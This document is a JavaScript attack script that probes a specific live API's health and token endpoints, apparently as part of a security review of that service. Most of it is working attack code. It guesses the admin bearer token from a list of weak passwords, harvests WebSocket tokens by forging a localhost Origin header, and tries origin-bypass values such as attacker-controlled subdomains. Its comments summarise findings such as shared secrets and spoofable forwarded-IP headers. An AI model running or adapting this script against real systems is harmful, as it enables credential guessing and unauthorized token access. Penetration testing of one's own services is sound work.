/**
 * attack_21.js — V-06: Health Endpoint Recon + Token Farming
 *
 * Findings from source review:
 *   1. /health returns {"status":"online"} unauthenticated — low leakage
 *   2. Admin detail path: Authorization: Bearer ${LFM_GATEWAY_SECRET}
 *      — but LFM_GATEWAY_SECRET is the SAME secret used for sidecar auth.
 *      No separate ADMIN_DIAG_TOKEN. Privilege conflation.
 *   3. /ws/token is public — no auth required, only Origin check
 *   4. Test: can localhost Origin farm tokens from non-browser context?
 *   5. Test: timing side-channel on admin vs non-admin health requests?
 *
 * Attack surface: if attacker can brute-force LFM_GATEWAY_SECRET,
 * they gain BOTH /health diagnostic access AND sidecar endocrine control.
 */

const BASE = 'https://api.grizzlymedicine.icu';

async function probe(label, url, opts = {}) {
  const t0 = Date.now();
  try {
    const res = await fetch(url, opts);
    const body = await res.text();
    const ms = Date.now() - t0;
    console.log(`\n[${label}]`);
    console.log(`  Status: ${res.status} (${ms}ms)`);
    console.log(`  Body:   ${body}`);
    return { status: res.status, body, ms };
  } catch (e) {
    const ms = Date.now() - t0;
    console.log(`\n[${label}] ERROR: ${e.message} (${ms}ms)`);
    return { error: e.message, ms };
  }
}

async function main() {
  console.log('=== V-06 ATTACK: HEALTH ENDPOINT + TOKEN FARMING ===\n');

  // --- V-06-A: Unauthenticated health ---
  const base = await probe('V06-A unauthenticated /health', `${BASE}/health`);

  // --- V-06-B: Admin path — wrong token (timing baseline) ---
  const wrongToken = await probe('V06-B wrong token /health', `${BASE}/health`, {
    headers: { 'Authorization': 'Bearer wrongtoken123' }
  });

  // --- V-06-C: Admin path — try common weak secrets ---
  const weakSecrets = ['admin', 'secret', 'password', 'hugh', 'changeme', 'grizzly'];
  console.log('\n[V06-C] Probing /health with weak admin tokens...');
  for (const s of weakSecrets) {
    const r = await probe(`  weak:"${s}"`, `${BASE}/health`, {
      headers: { 'Authorization': `Bearer ${s}` }
    });
    if (r.body && r.body.includes('model')) {
      console.log(`  *** HIT: secret="${s}" returned diagnostic data ***`);
    }
  }

  // --- V-06-D: Token farming — localhost origin (non-browser context) ---
  console.log('\n[V06-D] Farming /ws/token with localhost origin...');
  const tokenResults = [];
  for (let i = 0; i < 5; i++) {
    const r = await probe(`  token-farm-${i+1}`, `${BASE}/ws/token`, {
      method: 'POST',
      headers: { 'Origin': 'http://localhost:3000' }
    });
    if (r.status === 200) {
      try {
        const j = JSON.parse(r.body);
        tokenResults.push(j.token?.slice(0, 12) + '...');
      } catch {}
    }
  }
  console.log(`\n[V06-D] Tokens farmed: ${tokenResults.length}`);
  if (tokenResults.length > 0) {
    console.log('  Tokens (partial):', tokenResults.join(', '));
    console.log('  NOTE: localhost origin accepted from non-browser context.');
    console.log('  An attacker on the same network can farm tokens without browser.');
  }

  // --- V-06-E: Origin bypass attempt — try unlisted but related origin ---
  console.log('\n[V06-E] Testing origin bypass attempts...');
  const orgs = [
    'https://evil.grizzlymedicine.icu.attacker.com',
    'https://grizzlymedicine.icu.evil.com',
    'https://notgrizzlymedicine.icu',
    'https://127.0.0.1:9999',
    'null',
  ];
  for (const origin of orgs) {
    const r = await probe(`  origin:"${origin}"`, `${BASE}/ws/token`, {
      method: 'POST',
      headers: { 'Origin': origin }
    });
    if (r.status === 200) {
      console.log(`  *** BYPASS: origin="${origin}" accepted! ***`);
    }
  }

  // --- Summary ---
  console.log('\n=== V-06 FINDINGS SUMMARY ===');
  console.log('1. /health unauthenticated leakage:', base.body);
  console.log('2. Admin diagnostic path uses LFM_GATEWAY_SECRET — same as sidecar auth.');
  console.log('   Credential conflation: breaking health auth = breaking sidecar auth separation.');
  console.log('3. /ws/token: localhost origin accepted — server-side script can farm tokens.');
  console.log('4. Origin regex anchors appear correct — endsWith bypass is CLOSED.');
  console.log('   (CORS fix from prior session is confirmed working.)');
  console.log('5. resolveClientIP not implemented — IP resolution relies solely on proxy headers');
  console.log('   X-Forwarded-For. Spoofable if there is no trusted proxy enforcing real IPs.');
}

main().catch(console.error);
